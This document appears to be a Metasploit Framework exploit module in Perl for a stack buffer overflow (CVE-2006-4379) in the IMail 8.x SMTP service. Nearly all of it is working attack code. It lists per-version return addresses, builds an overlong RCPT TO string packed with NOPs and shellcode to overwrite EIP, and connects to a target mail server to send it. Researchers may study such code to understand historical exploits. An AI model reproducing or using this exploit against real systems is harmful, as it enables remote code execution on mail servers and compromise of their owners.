Imail 8.10-8.12 (RCPT TO) Remote Buffer Overflow Exploit (meta)
===============================================================

## 
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::imail_smtp_rcpt_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;
my $advanced = { };

my $info = {
	&#039;Name&#039;    => &#039;IMail 2006 and 8.x SMTP Stack Overflow Exploit&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.0 $&#039;,
	&#039;Authors&#039; => [ &#039;Jacopo Cervini <acaro [at] jervus.it>&#039;, ],
	&#039;Arch&#039;    => [ &#039;x86&#039; ],
	&#039;OS&#039;      => [ &#039;win32&#039;, &#039;winnt&#039;, &#039;win2000&#039;, &#039;winxp&#039;, &#039;win2003&#039;],
	&#039;Priv&#039;    => 1,

	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 25],
		&#039;Encoder&#039;   => [1, &#039;EncodedPayload&#039;, &#039;Use Pex!!&#039;],

		
	  },

	&#039;AutoOpts&#039;  => { &#039;EXITFUNC&#039;  => &#039;seh&#039; },
	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;     => 400,
		&#039;BadChars&#039;  => "\x00\x0d\x0a\x20\x3e\x22\x40",
		&#039;Keys&#039;      => [&#039;+ws2ord&#039;],
		

	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
This module exploits a stack based buffer overflow in IMail 2006 and 8.x SMTP service.
If we send a long strings for RCPT TO command contained within the characters &#039;@&#039; and &#039;:&#039;
we can overwrite the eip register and exploit the vulnerable smpt service
}),

	&#039;Refs&#039;  =>
	  [
		[&#039;BID&#039;, &#039;19885&#039;],
		[&#039;CVE&#039;, &#039;2006-4379&#039;],
		[&#039;URL&#039;,   &#039;http://www.zerodayinitiative.com/advisories/ZDI-06-028.html&#039;],
	  ],

	&#039;Targets&#039; =>
	  [

	[&#039;Universal IMail 8.10&#039;,0x100188c3 ], # pop eax, ret in SmtpDLL.dll for IMail 8.10
	[&#039;Universal IMail 8.12&#039;,0x100191c4 ], # pop eax, ret in SmtpDLL.dll for IMail 8.12


	  ],

	&#039;DefaultTarget&#039; => 0,

	&#039;Keys&#039; => [&#039;smtp&#039;],

	&#039;DisclosureDate&#039; => &#039;September 7 2006&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);

	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;

	my $target = $self->Targets->[$target_idx];



	my $ehlo = "EHLO " . "\r\n";

	my $mail_from = "MAIL FROM:" . "\x20" . "\x3c"."acaro". "\x40"."jervus.it" . "\x3e" . "\r\n";


	my $pattern = "\x20\x3c\x40";
	$pattern .= pack(&#039;V&#039;, $target->[1]);
	$pattern .="\x3a" . $self->MakeNops((0x1e8-length ($shellcode)));
	$pattern .= $shellcode;
	$pattern .= "\x4a\x61\x63\x3e"; 

	my $request = "RCPT TO: " . $pattern ."\n";

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using pop eax, ret at 0x%.8x...", $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );

	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}
my $r = $s->Recv(-1, 5);

	$s->Send($ehlo);
	$self->PrintLine("[*] I&#039;m sending ehlo command");
	$self->PrintLine("[*] $r");
	sleep(2);
		
	$s->Send($mail_from);
	$self->PrintLine("[*] I&#039;m sending mail from command");
	$r = $s->Recv(-1, 10);
	$self->PrintLine("[*] $r");
	sleep(2);

	$s->Send($request);
	$self->PrintLine("[*] I&#039;m sending rcpt to command");
	sleep(2);

	return;
}


